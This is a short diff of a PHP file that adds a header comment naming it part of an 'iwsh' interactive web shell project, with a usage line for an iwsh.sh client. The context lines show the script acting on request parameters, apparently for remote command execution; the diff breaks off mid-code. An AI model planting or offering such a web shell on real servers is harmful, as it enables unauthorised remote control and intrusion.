@@ -1,4 +1,8 @@
 <?php
+/*
+*   Created by NumquamScire for iwsh project.
+*   Access to full interactive web shell use client iwsh.sh -u http://localhost/PATH_TO_FILE/iwsh.php -d
+*/
 
 if (isset($_REQUEST['o']) || isset($_REQUEST['i']) || isset($_REQUEST['c']) || isset($_REQUEST['fi'])) {
     if(isset($_REQUEST['i'])){
